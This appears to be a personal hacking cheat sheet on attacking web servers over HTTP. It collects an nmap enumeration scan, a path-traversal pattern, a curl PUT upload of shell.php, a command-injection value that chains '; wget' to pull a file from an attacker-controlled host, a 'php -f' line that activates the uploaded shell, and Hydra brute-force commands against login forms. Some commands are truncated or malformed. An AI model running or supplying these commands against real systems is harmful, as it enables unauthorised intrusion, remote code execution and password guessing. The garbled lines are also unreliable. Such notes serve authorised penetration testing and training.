---
tags: 🔻 🔻/Enumeration
aliases: Hacking Notes
---

# HTTP Enumeration
#Enumeration 

#nmap script for full enumeration

*Quick  search for everything possible*
nmap -sV -n -Pn -vv -p 80 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt



# Command Injection
#commandinjection
  
File Traverse:  
website.com/file.php\[?path=/\]  
  
Test HTTP options using curl:  
curl -vX OPTIONS \[website\]  
  
Upload file using CURL to website with PUT option available  
curl --upload-file shell.php --url

[http://](http://192.168.218.139/test/shell.php)


  
Transfer file (Try temp directory if not writable)(wget -O tells it where to store):  
?path=/; wget

[http://IPADDRESS:8000/FILENAME.EXTENTION;](http://ipaddress:8000/FILENAME.EXTENTION;)

 
  
Activate shell file:  
; php -f filelocation.php;

# Hydra post form
#hydra

hydra -l admin -P "/usr/share/seclists/Passwords/darkweb2017-topx.x.x.x  
  
hydra -l "root@localhost" -P "pass.txt" -e nsr -s 80 -o "http\_form\_hydra.txt" *target ip*